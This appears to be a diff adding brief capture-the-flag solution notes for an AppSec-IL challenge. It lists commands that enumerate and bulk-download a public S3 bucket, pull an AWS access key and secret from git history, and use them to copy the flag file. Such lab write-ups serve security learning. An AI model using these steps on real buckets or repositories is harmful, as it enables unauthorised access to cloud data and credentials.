@@ -1,0 +1,21 @@
+curl -I http://static.appsecil.ctf.today/
+	x-amz-id-2
+	x-amz-request-id
+http://static.appsecil.ctf.today.s3.amazonaws.com/
+
+http://static.appsecil.ctf.today.s3.amazonaws.com/flag.txt
+	Access Denied
+
+# Download all files
+curl http://static.appsecil.ctf.today.s3.amazonaws.com/ -s | grep -Po '(?<=<Key>)([^<]+)(?=</Key>)' | while read line ; do dirname="$(dirname $line)"; mkdir -p bucket/$dirname; curl -s http://static.appsecil.ctf.today.s3.amazonaws.com/$line > bucket/$line ; done
+
+git log
+	cedbb182b85c38205239bb72029ad208cdf28a4c
+git log -p -1 cedbb182b85c38205239bb72029ad208cdf28a4c
+	AWS_KEY = "AKIAQEOEU25UQKGTPPOR"
+	AWS_SECRET = "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"
+
+
+aws s3 ls s3://static.appsecil.ctf.today
+aws s3 cp s3://static.appsecil.ctf.today/flag.txt .
+	AppSec-IL{Keep-j00r-AW2-Key2-t0-j00R5eLF}
